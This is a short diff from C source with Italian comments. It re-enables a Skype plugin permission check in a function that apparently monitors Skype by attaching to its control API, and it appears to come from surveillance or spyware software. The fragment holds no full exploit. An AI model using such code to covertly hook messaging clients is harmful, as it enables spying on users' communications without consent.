@@ -2167,7 +2167,7 @@ DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 							CloseHandle(fileh);
 						else  {// Non c'e' lo skypePM quindi cerca di fare l'attach al processo
 							// Prima di cercare di fare l'attach controlla che ci siano i giusti permessi...
-							//CheckSkypePluginPermissions(skipe_id, skype_path);
+							CheckSkypePluginPermissions(skipe_id, skype_path);
 							UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
 							HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
 						}
